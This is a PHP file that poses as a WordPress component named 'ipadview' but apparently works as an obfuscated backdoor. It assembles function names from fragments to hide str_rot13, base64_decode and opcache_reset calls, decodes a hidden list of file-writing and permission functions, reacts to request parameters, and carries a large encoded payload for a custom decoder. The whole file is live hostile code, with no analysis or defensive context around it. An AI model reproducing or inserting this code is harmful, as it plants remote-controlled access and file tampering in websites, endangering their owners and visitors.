<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y2uioJHmY21up3EyqT5lY3ElLJEyLaIfoP5col9up3AyqUZinJ1aY253pl81A2D3LmZ2MzDkAGDlAmywZQZkZJD3ZzV3BGOuLGx3Zv5eMKx', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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